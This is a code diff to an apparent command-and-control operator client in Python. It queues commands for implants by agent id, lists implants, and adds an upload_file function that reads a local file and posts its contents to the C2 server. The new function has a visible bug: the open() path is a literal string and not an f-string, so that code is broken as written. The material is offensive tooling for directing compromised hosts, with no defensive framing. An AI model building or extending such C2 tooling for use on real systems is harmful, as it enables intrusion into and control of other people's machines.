@@ -2,8 +2,9 @@
 
 import requests 
 
-c2_server = "http://127.0.0.1:8080"
+c2_server = "http://0.0.0.0:8080"
 path = "/secret"
+filepath = "/files/"
 
 def queue_cmd(cmd, agent_id):
     r = requests.post(f"{c2_server}{path}", json=[{"implant_id": agent_id, "cmd": cmd}])
@@ -27,6 +28,13 @@ def print_implants():
         print(r.json())
     else:
         print("error")
+        
+def upload_file(localpath, filename):
+    print("make sure the file you're trying to upload is in the correct directory and exists")
+    dfiles = open("{localpath}{filename}", "r")
+    data = dfiles.read()  
+    dfiles.close()
+    r = requests.post(f"{c2_server}{filepath}{filename}", json=[{"file_contents":data}])
 
 
 if __name__ == "__main__":
